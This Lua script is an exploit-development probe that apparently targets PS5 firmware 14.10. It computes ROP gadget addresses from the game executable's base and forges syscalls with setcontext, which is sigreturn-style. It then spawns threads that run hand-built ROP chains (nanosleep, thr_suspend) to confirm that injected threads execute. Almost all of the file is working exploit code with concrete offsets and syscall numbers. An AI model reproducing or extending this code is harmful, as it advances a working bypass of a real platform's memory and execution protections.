-- CRASH_CLASS: MODERATE
-- PROBE 142k: ROP nanosleep thread — definitive execution test
--
-- 142j: 80a format threads don't execute (no crash, no effects)
-- 142i: getcontext format threads DO execute but crash (binary output)
-- Problem: previous tests used WAIT (needs RDX) or LOCK_PI (may not
-- block intra-process on PS5). nanosleep only needs RDI and RAX.
--
-- ROP: pop_rdi→timespec, pop_rsi→0, pop_rax→240, syscall
-- Child sleeps 10s. Main checks thr_kill during sleep.
-- Also try thr_suspend(442): pop_rdi→0, pop_rax→442, syscall

print("=== PROBE 142k: ROP NANOSLEEP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local O_RIP = MC + 0xA0   -- 0xE0
local O_RSP = MC + 0xB8   -- 0xF8

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + O_RIP)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + O_RIP, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Eboot base + gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

-- Main TID
local tid_main = gpu + 0x100
wq(tid_main, uint64(0))
srop(432, ua(tid_main))
local mtl = to_num(safe_rd(tid_main))
print("main_TID=" .. mtl)

-- Timespec for 30-second sleep on GPU memory
local tspec = gpu + 0x200
wq(tspec, uint64(30))    -- tv_sec = 30
wq(tspec + 8, uint64(0)) -- tv_nsec = 0

--------------------------------------------------------------------
-- [A] ROP nanosleep: pop_rdi→tspec, pop_rsi→0, pop_rax→240, syscall
-- Child sleeps 30s. Main checks thr_kill every 500ms.
--------------------------------------------------------------------
print("")
print("--- [A] ROP nanosleep(30s) ---")

local stack_a = gpu + 0x10000
for off = 0, 0x3FFF, 4 do wd(stack_a + off, 0) end

local rop_a = stack_a + 0x3000
wq(rop_a + 0x00, g_pop_rdi)            -- pop rdi; ret
wq(rop_a + 0x08, ua(tspec))            -- → rdi = timespec ptr
wq(rop_a + 0x10, g_pop_rsi)            -- pop rsi; ret
wq(rop_a + 0x18, uint64(0))            -- → rsi = NULL (no remainder)
wq(rop_a + 0x20, g_pop_rax)            -- pop rax; ret
wq(rop_a + 0x28, uint64(240))          -- → rax = nanosleep
wq(rop_a + 0x30, sc_addr)              -- syscall → nanosleep(30s)
wq(rop_a + 0x38, uint64(0))            -- return addr → crash (after 30s)

-- Context from getcontext (the format that DOES execute threads)
local ctx_a = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx_a + off, 0) end
pcall(function() return sc_gc(uint64(ctx_a)) end)
-- Only override RIP and RSP
wq(ctx_a + O_RIP, g_ret)
wq(ctx_a + O_RSP, ua(rop_a))

local tid_a = gpu + 0x30000
wq(tid_a, uint64(0xDEADDEAD))

print("[A] Creating nanosleep thread...")
local ok_a, rv_a = pcall(function()
    return sc_thr_create(uint64(ctx_a), uint64(tid_a), uint64(0))
end)
local ntid_a = safe_rq(tid_a)
local nah, nal = get_hi_lo(ntid_a)
print("[A] ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a) .. " tid=" .. nal)

-- Check thr_kill every 500ms for 3 seconds
for check = 1, 6 do
    local ts2 = memory.alloc(16)
    wq(ts2, uint64(0)); wq(ts2 + 8, uint64(500000000))
    pcall(function() sc_nanosleep(uint64(ts2), uint64(0)) end)

    local alive = to_num(sc20())
    if alive == 0 then
        print("[A] PROCESS DIED at check " .. check)
        break
    end

    if nal ~= 0 and nal ~= 0xDEADDEAD then
        -- make_syscall thr_kill
        local ok_k, rv_k = pcall(function()
            return make_syscall(433)(uint64(nal), uint64(0))
        end)
        local rvs = ""
        if rv_k then
            local kvh, kvl = get_hi_lo(rv_k)
            rvs = tostring(kvl)
            if kvl == 0 and kvh == 0 then rvs = "0=ALIVE" end
        end
        print("[A] check" .. check .. ": pid=" .. alive .. " thr_kill=" .. rvs)

        -- Also SROP thr_kill
        local rv_ks = srop(433, uint64(nal), uint64(0))
        local ksh, ksl = get_hi_lo(rv_ks)
        if ksl == 0 and ksh == 0 then
            print("[A] *** SROP thr_kill=0 → CHILD IS ALIVE! ***")
            print("[A] *** THREAD EXECUTION CONFIRMED ON PS5 14.10! ***")
        end
    end
end

--------------------------------------------------------------------
-- [B] ROP thr_suspend: pop_rdi→0(NULL timeout), pop_rax→442, syscall
-- thr_suspend blocks indefinitely. Simpler than nanosleep.
--------------------------------------------------------------------
print("")
print("--- [B] ROP thr_suspend(442) ---")

local stack_b = gpu + 0x14000
for off = 0, 0x3FFF, 4 do wd(stack_b + off, 0) end

local rop_b = stack_b + 0x3000
wq(rop_b + 0x00, g_pop_rdi)
wq(rop_b + 0x08, uint64(0))            -- rdi = NULL (infinite suspend)
wq(rop_b + 0x10, g_pop_rax)
wq(rop_b + 0x18, uint64(442))          -- rax = thr_suspend
wq(rop_b + 0x20, sc_addr)
wq(rop_b + 0x28, uint64(0))

local ctx_b = gpu + 0x28000
for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
pcall(function() return sc_gc(uint64(ctx_b)) end)
wq(ctx_b + O_RIP, g_ret)
wq(ctx_b + O_RSP, ua(rop_b))

local tid_b = gpu + 0x30010
wq(tid_b, uint64(0xDEADDEAD))

print("[B] Creating thr_suspend thread...")
local ok_b, rv_b = pcall(function()
    return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
end)
local ntid_b = safe_rq(tid_b)
local nbh, nbl = get_hi_lo(ntid_b)
print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. nbl)

-- Check thr_kill
local ts3 = memory.alloc(16)
wq(ts3, uint64(0)); wq(ts3 + 8, uint64(500000000))
pcall(function() sc_nanosleep(uint64(ts3), uint64(0)) end)

print("[B] alive pid=" .. to_num(sc20()))

if nbl ~= 0 and nbl ~= 0xDEADDEAD then
    local rv_kb = srop(433, uint64(nbl), uint64(0))
    local kbh, kbl = get_hi_lo(rv_kb)
    print("[B] thr_kill=" .. hex(rv_kb) .. " (0=alive)")
    if kbl == 0 and kbh == 0 then
        print("[B] *** CHILD IS ALIVE (SUSPENDED)! ***")
    end
end

--------------------------------------------------------------------
-- [C] Verify via sys624 counter
--------------------------------------------------------------------
print("")
print("--- [C] sys624 delta ---")
local s_before = srop(624)
local sbh, sbl = get_hi_lo(s_before)

-- Create another nanosleep thread
local stack_c = gpu + 0x18000
for off = 0, 0x3FFF, 4 do wd(stack_c + off, 0) end
local rop_c = stack_c + 0x3000
wq(rop_c + 0x00, g_pop_rdi)
wq(rop_c + 0x08, ua(tspec))
wq(rop_c + 0x10, g_pop_rsi)
wq(rop_c + 0x18, uint64(0))
wq(rop_c + 0x20, g_pop_rax)
wq(rop_c + 0x28, uint64(240))
wq(rop_c + 0x30, sc_addr)

local ctx_c = gpu + 0x30100
for off = 0, 0x4FF, 4 do wd(ctx_c + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c)) end)
wq(ctx_c + O_RIP, g_ret)
wq(ctx_c + O_RSP, ua(rop_c))

local tid_c = gpu + 0x30020
wq(tid_c, uint64(0xDEADDEAD))
pcall(function()
    return sc_thr_create(uint64(ctx_c), uint64(tid_c), uint64(0))
end)

pcall(function() sc_nanosleep(uint64(ts3), uint64(0)) end)

local s_after = srop(624)
local sah, sal = get_hi_lo(s_after)
print("[C] sys624: before=" .. sbl .. " after=" .. sal .. " delta=" .. (sal - sbl))

print("")
print("=== DONE ===")
